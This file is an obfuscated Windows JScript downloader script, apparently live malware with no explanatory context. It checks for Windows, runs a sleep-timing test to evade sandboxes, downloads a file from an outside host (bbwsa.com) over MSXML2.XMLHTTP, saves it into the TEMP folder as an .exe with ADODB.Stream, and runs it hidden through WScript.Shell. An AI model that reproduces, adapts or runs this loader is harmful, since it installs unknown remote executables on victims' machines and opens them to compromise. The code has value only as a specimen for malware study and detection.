var Lyllepomu = false;
var Vdnfu = "CreateObject";
var Pspzcderc = function Upsmecsmij() {return WScript[Vdnfu]("WScript.Shell");}();
var Ewyropdchg = 123213;
var Jlmgrkoyt = "MSXML2.XMLHTTP";
var Mztstchif = 2123213;
var Eytjk = 0;
function Pnzsq(Risvf){Pspzcderc["Run"](Risvf, Eytjk, Eytjk);};
function Khrwurhlnw(){return Jlmgrkoyt;};
function Obrutd(Curaaxwj, Rtngj){return Curaaxwj - Rtngj;};
function Grqvu(){return Vdnfu;};
/*@cc_on
  @if (@_win32 || @_win64)
    Lyllepomu = true;
  @end
@*/
var Bpkbzy = "";
if (Lyllepomu)
{
function Nipaicy(){return 22;};
var Nqkbciepr = 0; var Qzrttntew = 0;
function Cbcgk()
{
var Rmjfaftji = new this["Date"]();
var Ygfqbbhac = Rmjfaftji["getUTCMilliseconds"]();
WScript["Sleep"](Nipaicy());
var Rmjfaftji = new this["Date"]();
var Hnbtto = Rmjfaftji["getUTCMilliseconds"]();
WScript["Sleep"](Nipaicy());
var Rmjfaftji = new this["Date"]();
var Xpmuhd = Rmjfaftji["getUTCMilliseconds"]();
var Nqkbciepr = "Xalgoi";
Nqkbciepr = Obrutd(Hnbtto, Ygfqbbhac);
var Qzrttntew = "Yfazj";
Qzrttntew = Obrutd(Xpmuhd, Hnbtto);
Bpkbzy = "open";
return Obrutd(Nqkbciepr, Qzrttntew);
}
var Tjqrfz = false;
var Itvfn = false;
for (var Lntcjvky = Eytjk; Lntcjvky < Nipaicy() * 1; Lntcjvky++){if (Cbcgk() != Eytjk){
Tjqrfz = true; 
Qzrttntew = "07t9gasdf76ags" + 123313 * Nqkbciepr + Qzrttntew; 
Itvfn = true; 
Qzrttntew = "07t9gasdf76ags" + 123313 * Nqkbciepr + Qzrttntew; 
break;
}}
function Fqvddsl() {return ((Tjqrfz == true) && (Tjqrfz == Itvfn)) ? 1 : Eytjk;};
if (Tjqrfz && Fqvddsl() && Itvfn){
function Rwskmskvbp() {return Pspzcderc["ExpandEnvironmentStrings"]("%TEMP%/") + "rJU8vekDnCL0DO.exe";};
 Anvkldx = Khrwurhlnw();
 Zlhtg = WScript[Vdnfu](Anvkldx);
 var Smppnej = 1;
 while (Smppnej){
try {
Zlhtg[Bpkbzy]("GET", "http://bbwsa.com/m7rysa", false);
Zlhtg["send"]();
Ejlbkjs = "Sleep";
do {WScript[Ejlbkjs](Nipaicy() * 11)} while (Zlhtg["readystate"] < 4 );
Smppnej = Eytjk;
} catch(Gmeco){Smppnej = ("asdfa", "fadfasdf", "afdafa", 2);};
}
function Ubevkpdscw(Hswzdunppw) {var Qwivguf = (1, 2, 3, 4, 5, Hswzdunppw); return Qwivguf;};
Vpgngo = WScript[Grqvu()]("ADODB.Stream");
Anvkldx = Vpgngo;
Anvkldx[Bpkbzy]();
Anvkldx["type"] = Ubevkpdscw(1);
Anvkldx["write"](Zlhtg["ResponseBody"]);
Vpgngo["position"] = Ubevkpdscw(Eytjk);
Anvkldx["SaveToFile"](Rwskmskvbp(), Ubevkpdscw(2) );
Vpgngo["close"]();
Pnzsq(Rwskmskvbp());
}
}

